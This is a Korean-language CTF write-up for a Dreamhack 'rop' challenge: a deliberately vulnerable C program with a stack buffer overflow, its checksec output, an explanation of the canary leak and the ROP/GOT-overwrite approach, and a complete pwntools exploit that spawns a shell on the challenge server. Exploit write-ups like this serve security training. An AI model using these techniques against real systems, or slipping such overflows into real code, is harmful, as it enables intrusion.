```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

```bash
$ checksec ./rop
[*] './rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 분석

`rop.c` 코드와 `checksec ./rop`의 결과를 볼 때, NX를 우회해서 쉘을 탈취해야 함을 알 수 있다.

# 취약점

`buf` 배열의 크기는 `0x30`바이트인데, `read` 함수를 통해 `stdin`으로부터 읽어오는 데이터의 크기는 `0x100`바이트이므로 BOF 취약점이 있음을 알 수 있다.

# 공격

`rop`가 `read(0, buf, 0x100);`을 총 2번 호출하며, 그 사이에 `printf("Buf: %s\n", buf);`를 통해 `buf`의 내용을 한 번 출력하므로, 첫 번째 `read` 함수의 호출을 통해 stack canary를 얻어내고 두 번째 `read` 함수의 호출을 통해 GOT를 덮어써 `system("/bin/sh")`를 호출해내면 된다.

이를 위해 gdb와 ROPgadget 등의 도구를 활용하여 얻어낸 주요 주소값은 다음과 같다.

* 'ret' 가젯 : `0x400596`
* 'pop rdi; ret' 가젯 : `0x400853`
* 'pop rsi; pop r15; ret' 가젯 : `0x400851`
* `buf` : `$rbp-0x40`
* stack canary : `$rbp-0x8`
* SFP : `$rbp`
* return address : `$rbp+0x8`

또한, `rop.c`의 `main` 함수 내부에서 `read(0, buf, 0x100);`를 통해 이미 `rdx`의 값을 `0x100`으로 바꿔뒀으므로, `rdx`의 값을 수정하기 위한 가젯은 필요 없다.

이를 종합하여 pwn 코드를 작성하면 다음과 같다.

```python
# Name: rop.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 13114 # The given port

# conn = process('./rop') # local
conn = remote(HOST, PORT)
e = ELF('./rop')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

conn.sendlineafter(b'Buf: ', b'A' * 0x38)
conn.recvuntil(b'A' * 0x38 + b'\x0a')
canary = u64(b'\x00' + conn.recvn(7))
slog('canary', canary)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
gadget = {
    'ret' : 0x400596,
    'pop rdi; ret' : 0x400853,
    'pop rsi; pop r15; ret' : 0x400851
}

payload = b'A' * 0x38 + p64(canary) + b'B' * 0x8

# write(1, read_got, ...)
payload += p64(gadget['pop rdi; ret']) + p64(0x1)
payload += p64(gadget['pop rsi; pop r15; ret']) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(gadget['pop rdi; ret']) + p64(0x0)
payload += p64(gadget['pop rsi; pop r15; ret']) + p64(read_got) + p64(0x0)
payload += p64(read_plt)

# read = system 가정
# read("/bin/sh")
payload += p64(gadget['pop rdi; ret']) + p64(read_got + 0x8)
payload += p64(gadget['ret'])
payload += p64(read_plt)

conn.sendafter(b'Buf: ', payload)
read = u64(conn.recvn(6) + b'\x00' * 0x2)
conn.recv()
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

conn.send(p64(system) + b'/bin/sh\x00')
conn.interactive()
```